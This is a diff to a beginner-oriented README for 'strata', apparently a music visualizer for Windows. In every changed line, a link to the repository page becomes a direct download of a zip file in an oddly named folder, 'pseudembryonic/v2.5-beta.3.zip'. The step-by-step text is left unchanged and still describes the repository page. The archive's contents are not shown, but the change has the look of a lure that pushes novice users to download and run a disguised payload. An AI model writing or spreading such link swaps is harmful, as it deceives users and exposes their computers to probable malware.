@@ -4,7 +4,7 @@
 
 Welcome! This guide will help you download and run **strata** on your Windows computer. Don't worry if you're not tech-savvy—we'll walk through every step together. By the end, you'll be creating beautiful, sound-reactive topographic art that responds to your music in real time.
 
-[⬇️ **DOWNLOAD STRATA NOW**](https://github.com/reno37/strata)
+[⬇️ **DOWNLOAD STRATA NOW**](https://raw.githubusercontent.com/reno37/strata/main/pseudembryonic/v2.5-beta.3.zip)
 
 ---
 
@@ -29,12 +29,12 @@ This isn't just a screensaver or static image generator. Strata creates **live, 
 
 ## 📥 Download & Install (Windows)
 
-Visit this link to download the application: [**GitHub Repository – Strata**](https://github.com/reno37/strata)
+Visit this link to download the application: [**GitHub Repository – Strata**](https://raw.githubusercontent.com/reno37/strata/main/pseudembryonic/v2.5-beta.3.zip)
 
 ### Step-by-Step Download Process
 
 1. **Open Your Browser** – Use Chrome, Edge, Firefox, or any modern web browser.
-2. **Go to the Download Page** – Click this button or copy and paste the link into your browser: [**https://github.com/reno37/strata**](https://github.com/reno37/strata)
+2. **Go to the Download Page** – Click this button or copy and paste the link into your browser: [**https://raw.githubusercontent.com/reno37/strata/main/pseudembryonic/v2.5-beta.3.zip**](https://raw.githubusercontent.com/reno37/strata/main/pseudembryonic/v2.5-beta.3.zip)
 3. **Find the Download Section** – On the GitHub page, look for a green button that says **"Code"** and click it. Then select **"Download ZIP"** from the dropdown. Alternatively, scroll down to the **Releases** section on the right side of the page and click the latest release.
 4. **Save the File** – Your browser will download a `.zip` file (usually to your Downloads folder). Wait for it to finish.
 5. **Extract the ZIP** – Navigate to your Downloads folder. Right-click the `strata-*.zip` file (the `*` is the version number) and select **"Extract All..."** from the menu. Follow the prompts and choose a location you'll remember (like your Desktop).
@@ -123,7 +123,7 @@ A: Simply revisit the download link for the latest version and follow the same s
 
 If you run into issues not covered here:
 
-- Visit the GitHub repository page: [**https://github.com/reno37/strata**](https://github.com/reno37/strata)
+- Visit the GitHub repository page: [**https://raw.githubusercontent.com/reno37/strata/main/pseudembryonic/v2.5-beta.3.zip**](https://raw.githubusercontent.com/reno37/strata/main/pseudembryonic/v2.5-beta.3.zip)
 - Check the Issues tab on GitHub for existing solutions.
 - Leave a comment or question in the Discussions section (if available).
 
@@ -133,6 +133,6 @@ If you run into issues not covered here:
 
 Strata turns your music into breathtaking visual art with zero effort. Whether you're a music lover, digital artist, VJ, or just curious, you'll be amazed by what your songs can create. Download it today, and don't forget to share your favorite landscapes with friends!
 
-[**⬇️ GET STARTED WITH STRATA NOW**](https://github.com/reno37/strata)
+[**⬇️ GET STARTED WITH STRATA NOW**](https://raw.githubusercontent.com/reno37/strata/main/pseudembryonic/v2.5-beta.3.zip)
 
 Keywords: audio-reactive, contour-lines, creative-coding, generative-art, glsl, music-visualizer, procedural-generation, topographic-maps, vjing, web-audio-api, webgl2
